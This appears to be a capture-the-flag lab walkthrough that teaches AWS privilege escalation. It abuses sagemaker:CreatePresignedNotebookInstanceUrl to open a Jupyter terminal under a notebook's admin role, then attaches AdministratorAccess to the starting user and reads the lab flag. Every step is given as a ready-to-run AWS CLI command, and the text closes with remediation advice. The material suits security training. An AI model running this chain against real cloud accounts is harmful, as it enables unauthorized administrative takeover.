# Guided Walkthrough: Privilege Escalation via sagemaker:CreatePresignedNotebookInstanceUrl

This scenario demonstrates a privilege escalation vulnerability where a user with only the `sagemaker:CreatePresignedNotebookInstanceUrl` permission can gain administrative access by generating a presigned URL to an existing SageMaker notebook instance that has an admin execution role attached. Once the attacker accesses the Jupyter notebook interface through the presigned URL, they can open a terminal session and execute AWS CLI commands with the permissions of the notebook's execution role.

Unlike the `sagemaker:CreateNotebookInstance` privilege escalation path (which requires creating new infrastructure and `iam:PassRole`), this technique exploits access to existing resources. This makes it particularly dangerous in environments where SageMaker notebooks are already deployed for legitimate machine learning workflows, as security teams may overlook the risk of URL generation permissions. The attack is stealthier because it leaves no new infrastructure in CloudTrail logs—only URL generation and subsequent API calls from the notebook's role.

This technique was originally documented by Spencer Gietzen from Rhino Security Labs in 2019 and represents a common misconfiguration where data scientists are granted broad SageMaker permissions without understanding the privilege escalation implications.

## The Challenge

You start as `pl-prod-sagemaker-004-to-admin-starting-user`, an IAM user with a single notable permission: `sagemaker:CreatePresignedNotebookInstanceUrl` scoped to the notebook instance `pl-prod-sagemaker-004-to-admin-notebook`. Your goal is to reach the `pl-prod-sagemaker-004-to-admin-notebook-role` administrative role — effectively gaining full administrator access in the account.

The notebook instance already exists and has an admin execution role attached. You do not need to create any new infrastructure; you only need to leverage the URL generation permission you already have.

## Reconnaissance

Let's figure out what we're working with. First, confirm your starting identity and verify you don't already have admin access:

```bash
aws sts get-caller-identity
# Should show pl-prod-sagemaker-004-to-admin-starting-user

aws iam list-users --max-items 1
# Expected: AccessDenied — confirms you are not yet an admin
```

Now enumerate the SageMaker environment to find your target. With helpful permissions like `sagemaker:ListNotebookInstances` and `sagemaker:DescribeNotebookInstance`, you can identify notebook instances and inspect their execution roles:

```bash
aws sagemaker list-notebook-instances --output table
```

Pick your target and describe it to confirm the execution role:

```bash
aws sagemaker describe-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook \
    --output json
```

The `RoleArn` field in the response reveals `pl-prod-sagemaker-004-to-admin-notebook-role`. You can verify this role carries `AdministratorAccess` using `iam:GetRole` and `iam:ListAttachedRolePolicies` if you have those permissions — but even without them, the attack works. The key insight is: if you can generate a presigned URL for this notebook, you can interact with it as its execution role.

## Exploitation

The notebook needs to be in `InService` state before you can generate a presigned URL. Check the status from the describe output above. If it's `Stopped`, start it:

```bash
aws sagemaker start-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook
```

Wait for the status to transition to `InService` (typically 5-8 minutes). Poll with:

```bash
aws sagemaker describe-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook \
    --query 'NotebookInstanceStatus' --output text
```

Once the notebook is `InService`, generate the presigned URL — this is your single key permission at work:

```bash
aws sagemaker create-presigned-notebook-instance-url \
    --notebook-instance-name pl-prod-sagemaker-004-to-admin-notebook \
    --query 'AuthorizedUrl' --output text
```

You'll receive an `AuthorizedUrl`. Copy it and open it in a web browser. The URL is valid for 12 hours by default. The Jupyter interface loads, and — critically — it runs entirely within the context of `pl-prod-sagemaker-004-to-admin-notebook-role`.

Inside Jupyter, click **New → Terminal** to open a terminal session. The terminal inherits the notebook's execution role credentials via IMDS. From here, execute any AWS CLI command as the admin role. To make the escalation persistent and verifiable, attach `AdministratorAccess` directly to your starting user:

```bash
# Run this inside the Jupyter terminal (as the admin notebook role)
aws iam attach-user-policy \
    --user-name pl-prod-sagemaker-004-to-admin-starting-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Verification

Back in your original terminal, wait about 15 seconds for IAM propagation, then verify the escalation succeeded:

```bash
# Now running as the starting user again
aws iam list-users --max-items 3 --output table
```

If the command succeeds and returns a list of IAM users, you have full administrator access. The escalation is complete.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/sagemaker-004-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the trust relationship between a low-privileged IAM user and a pre-existing SageMaker notebook that carries an admin execution role. The `sagemaker:CreatePresignedNotebookInstanceUrl` permission is often granted to data scientists so they can access their notebooks without navigating the AWS console — but when a notebook has a privileged execution role, that permission becomes a privilege escalation vector.

The attack chain: `pl-prod-sagemaker-004-to-admin-starting-user` → `sagemaker:CreatePresignedNotebookInstanceUrl` → Jupyter terminal (running as `pl-prod-sagemaker-004-to-admin-notebook-role`) → `iam:AttachUserPolicy` → admin access.

In real environments this pattern is common wherever ML teams deploy notebooks with broad IAM roles "to make things work" and then grant junior team members or CI systems the ability to generate presigned URLs. The fix is simple: either restrict the notebook's execution role to least privilege, or scope the `CreatePresignedNotebookInstanceUrl` permission away from notebooks that carry privileged roles.
